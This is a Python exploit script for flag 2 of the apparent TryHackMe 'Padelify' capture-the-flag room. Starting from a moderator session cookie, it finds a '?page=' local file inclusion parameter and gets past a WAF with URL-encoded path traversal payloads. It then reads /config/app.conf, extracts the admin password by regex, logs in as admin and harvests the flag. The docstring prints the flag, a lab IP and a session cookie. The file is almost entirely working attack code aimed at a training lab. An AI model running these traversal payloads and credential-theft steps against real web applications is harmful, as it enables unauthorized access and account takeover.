#!/usr/bin/env python3
"""
Padelify TryHackMe – Flag 2: Admin via LFI + WAF Bypass (URL-Encoding)

Attack flow:
  1. Use moderator session to access dashboard
  2. Find "Live" page with ?page= parameter (LFI vector)
  3. WAF blocks direct path traversal → URL-encode dots and slashes
  4. Read /config/app.conf via LFI → extract admin password
  5. Login as admin → Flag 2

Usage:
  python padelify_second.py --target 10.82.156.227 --cookie "PHPSESSID=dcsc8kbb3pq2refvi4as0qu8gh"

  THM{Logged_1n_Adm1n001}
"""

from __future__ import annotations

import argparse
import re
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def get(url: str, cookies: str = "", timeout: float = 10) -> tuple[int, str]:
    headers = {"User-Agent": UA}
    if cookies:
        headers["Cookie"] = cookies
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def post_form(url: str, data: dict, cookies: str = "", timeout: float = 10) -> tuple[int, str]:
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if cookies:
        headers["Cookie"] = cookies
    body = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body_text = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body_text
    except Exception as e:
        return 0, str(e)


def encode_path(path: str) -> str:
    """URL-encode dots and slashes to bypass WAF path-traversal filters."""
    return path.replace(".", "%2E").replace("/", "%2F")


def find_lfi_parameter(target: str, cookie: str) -> str | None:
    """Find the page with a ?page= parameter on the moderator dashboard."""
    base = f"http://{target}"

    # Check dashboard for links
    dashboard_paths = ["/dashboard.php", "/dashboard", "/index.php", "/"]
    for dpath in dashboard_paths:
        code, body = get(f"{base}{dpath}", cookies=cookie)
        if code != 200:
            continue

        # Find links with ?page= parameter
        page_links = re.findall(r'href=["\']([^"\']*\?page=[^"\']*)["\']', body, re.I)
        if page_links:
            print(f"[+] Found page links on {dpath}:")
            for link in page_links:
                print(f"    → {link}")
            return page_links[0]

        # Also look for "Live" or "live" links
        live_links = re.findall(r'href=["\']([^"\']*live[^"\']*)["\']', body, re.I)
        if live_links:
            print(f"[+] Found Live links on {dpath}:")
            for link in live_links:
                print(f"    → {link}")

        # Show all links for debugging
        all_links = re.findall(r'href=["\']([^"\']+)["\']', body, re.I)
        if all_links:
            print(f"[+] All links on {dpath}:")
            for link in all_links:
                if not link.startswith(("#", "javascript:", "http")):
                    print(f"    → {link}")

    return None


def try_lfi(target: str, cookie: str, base_url: str, lfi_path: str) -> tuple[int, str]:
    """Attempt LFI with URL-encoded path."""
    encoded = encode_path(lfi_path)
    # Build the full URL – base_url contains the ?page= part
    if "?" in base_url:
        param_name = base_url.split("?")[1].split("=")[0]
        page_base = base_url.split("?")[0]
    else:
        param_name = "page"
        page_base = base_url

    if not page_base.startswith("http"):
        page_base = f"http://{target}{page_base}"

    url = f"{page_base}?{param_name}={encoded}"
    print(f"[+] LFI attempt: {url}")
    return get(url, cookies=cookie)


def extract_admin_password(conf_body: str) -> str | None:
    """Extract admin password from app.conf contents."""
    # Look for admin_info, admin_password, password, etc.
    patterns = [
        r'admin_info\s*=\s*["\']([^"\']+)["\']',
        r'admin_pass(?:word)?\s*=\s*["\']([^"\']+)["\']',
        r'password\s*=\s*["\']([^"\']+)["\']',
        r'admin_info\s*=\s*(\S+)',
    ]
    for pat in patterns:
        m = re.search(pat, conf_body, re.I)
        if m:
            return m.group(1)
    return None


def login_as_admin(target: str, username: str, password: str) -> tuple[str | None, str | None]:
    """Login as admin and return (cookie, response_body)."""
    base = f"http://{target}"
    login_paths = ["/login.php", "/login", "/admin/login.php", "/admin/login"]

    for path in login_paths:
        # First GET the login page to get a PHPSESSID
        code, body = get(f"{base}{path}")
        if code != 200:
            continue

        # Find form fields
        fields = re.findall(r'name=["\']([^"\']+)["\']', body, re.I)
        print(f"[+] Login form fields at {path}: {fields}")

        # Try to get a fresh session cookie
        headers = {"User-Agent": UA}
        req = urllib.request.Request(f"{base}{path}", headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp_cookies = resp.headers.get_all("Set-Cookie") or []
        except Exception:
            resp_cookies = []

        session_cookie = ""
        for c in resp_cookies:
            if "PHPSESSID" in c:
                session_cookie = c.split(";")[0]
                break

        # Build login form data
        form_data = {}
        for field in fields:
            fl = field.lower()
            if fl in ("username", "user", "name", "login"):
                form_data[field] = username
            elif fl in ("password", "pass", "passwd"):
                form_data[field] = password

        if not form_data:
            form_data = {"username": username, "password": password}

        print(f"[+] Logging in as '{username}' at {path}...")
        code, resp_body = post_form(f"{base}{path}", form_data, cookies=session_cookie)
        print(f"[+] Login response: {code} ({len(resp_body)} bytes)")

        # Check for redirect or dashboard content
        if code == 200:
            flags = re.findall(r'(?:THM|flag)\{[^}]+\}', resp_body, re.I)
            if flags:
                return session_cookie, resp_body
            if "admin" in resp_body.lower() or "dashboard" in resp_body.lower() or "welcome" in resp_body.lower():
                return session_cookie, resp_body
            # Even if no flag visible, might need to follow redirect
            if "location" in resp_body.lower() or "redirect" in resp_body.lower():
                return session_cookie, resp_body

        # Try accessing dashboard with this session
        if session_cookie:
            for dpath in ["/dashboard.php", "/dashboard", "/admin.php", "/admin", "/"]:
                dc, dbody = get(f"{base}{dpath}", cookies=session_cookie)
                if dc == 200:
                    flags = re.findall(r'(?:THM|flag)\{[^}]+\}', dbody, re.I)
                    if flags:
                        return session_cookie, dbody

    return None, None


def main():
    parser = argparse.ArgumentParser(
        description="Padelify Flag 2: LFI to read app.conf → admin login"
    )
    parser.add_argument("--target", default="10.82.156.227", help="Target IP")
    parser.add_argument("--cookie", required=True, help="Moderator PHPSESSID cookie")
    args = parser.parse_args()

    cookie = args.cookie
    if not cookie.startswith("PHPSESSID="):
        cookie = f"PHPSESSID={cookie}"

    base = f"http://{args.target}"

    # ── Step 1: Verify moderator access ──
    print("=" * 60)
    print("[1] Verifying moderator session...")
    print("=" * 60)
    code, body = get(f"{base}/dashboard.php", cookies=cookie)
    if code != 200:
        code, body = get(f"{base}/dashboard", cookies=cookie)
    if code == 200 and ("dashboard" in body.lower() or "moderator" in body.lower() or "welcome" in body.lower()):
        print(f"[+] Moderator session valid! Dashboard loaded ({len(body)} bytes)")
    else:
        print(f"[!] Dashboard returned {code} – cookie might be expired")
        print("[!] Continuing anyway...")

    # ── Step 2: Find LFI vector ──
    print(f"\n{'=' * 60}")
    print("[2] Searching for LFI vector (?page= parameter)...")
    print("=" * 60)
    lfi_link = find_lfi_parameter(args.target, cookie)

    # If not found automatically, try known paths
    if not lfi_link:
        print("[!] Could not find ?page= link automatically, trying common paths...")
        candidates = [
            "/dashboard.php?page=match.php",
            "/dashboard.php?page=live.php",
            "/live.php?page=match.php",
            "/index.php?page=match.php",
        ]
        for c in candidates:
            code, body = get(f"{base}{c}", cookies=cookie)
            if code == 200 and len(body) > 100:
                print(f"[+] Found working LFI endpoint: {c}")
                lfi_link = c
                break

    if not lfi_link:
        print("[!] No LFI endpoint found – check dashboard manually")
        return

    # ── Step 3: Exploit LFI to read app.conf ──
    print(f"\n{'=' * 60}")
    print("[3] Exploiting LFI to read /config/app.conf...")
    print("=" * 60)

    # Various traversal payloads to try
    lfi_payloads = [
        "../config/app.conf",           # one level up
        "../../config/app.conf",         # two levels up
        "../config/app%2Econf",          # only dot encoded
        "..%2Fconfig%2Fapp%2Econf",      # partial encoding
        "%2E%2E%2Fconfig%2Fapp%2Econf",  # full encoding (recommended)
        "%2E%2E/%2E%2E/config/app%2Econf",
        "%2E%2E%2F%2E%2E%2Fconfig%2Fapp%2Econf",
    ]

    conf_body = None
    for payload in lfi_payloads:
        # Build URL manually (don't double-encode)
        if "?" in lfi_link:
            param_name = lfi_link.split("?")[1].split("=")[0]
            page_base = lfi_link.split("?")[0]
        else:
            param_name = "page"
            page_base = lfi_link

        if not page_base.startswith("http"):
            if not page_base.startswith("/"):
                page_base = f"/{page_base}"
            page_base = f"{base}{page_base}"

        url = f"{page_base}?{param_name}={payload}"
        print(f"\n[+] Trying: {url}")
        code, body = get(url, cookies=cookie)
        print(f"    → {code} ({len(body)} bytes)")

        if code == 403:
            print("    → WAF BLOCKED")
            continue

        if code == 200 and ("admin_info" in body or "admin_pass" in body or "password" in body.lower()):
            print(f"    → CONFIG FILE FOUND!")
            conf_body = body
            break

        if code == 200 and len(body) > 50:
            # Show preview in case it's partially working
            preview = body[:300].replace("\n", " ").strip()
            print(f"    → Preview: {preview[:150]}")

    if not conf_body:
        print("\n[!] Could not read app.conf via any LFI payload")
        print("[i] Try manually in browser with moderator cookie:")
        print(f"    {base}/dashboard.php?page=%2E%2E%2Fconfig%2Fapp%2Econf")
        return

    # ── Step 4: Extract admin password ──
    print(f"\n{'=' * 60}")
    print("[4] Extracting admin credentials from app.conf...")
    print("=" * 60)
    print(f"\n[+] app.conf contents:")
    print("─" * 40)
    print(conf_body[:2000])
    print("─" * 40)

    admin_pw = extract_admin_password(conf_body)
    if admin_pw:
        print(f"\n[!!!] Admin password found: {admin_pw}")
    else:
        print("[!] Could not auto-extract password – check output above manually")
        return

    # ── Step 5: Login as admin ──
    print(f"\n{'=' * 60}")
    print("[5] Logging in as admin...")
    print("=" * 60)

    admin_cookie, resp_body = login_as_admin(args.target, "admin", admin_pw)

    if resp_body:
        # Search for flag
        flags = re.findall(r'(?:THM|flag)\{[^}]+\}', resp_body, re.I)
        if flags:
            print(f"\n{'=' * 60}")
            print("[!!!] FLAG 2 FOUND:")
            for f in flags:
                print(f"      {f}")
            print(f"{'=' * 60}")
        else:
            print("\n[+] Logged in but flag not in immediate response")
            print("[+] Checking dashboard pages with admin session...")

            if admin_cookie:
                for path in ["/dashboard.php", "/dashboard", "/admin.php", "/admin",
                             "/", "/index.php", "/panel.php", "/flag.php"]:
                    code, body = get(f"{base}{path}", cookies=admin_cookie)
                    if code == 200:
                        flags = re.findall(r'(?:THM|flag)\{[^}]+\}', body, re.I)
                        if flags:
                            print(f"\n{'=' * 60}")
                            print(f"[!!!] FLAG 2 FOUND at {path}:")
                            for f in flags:
                                print(f"      {f}")
                            print(f"{'=' * 60}")
                            break
                        if len(body) > 100:
                            print(f"[+] {path} → {code} ({len(body)} bytes)")
    else:
        print("\n[!] Admin login failed")
        print(f"[i] Try manually: username=admin, password={admin_pw}")
        print(f"[i] Login page: {base}/login.php")


if __name__ == "__main__":
    main()
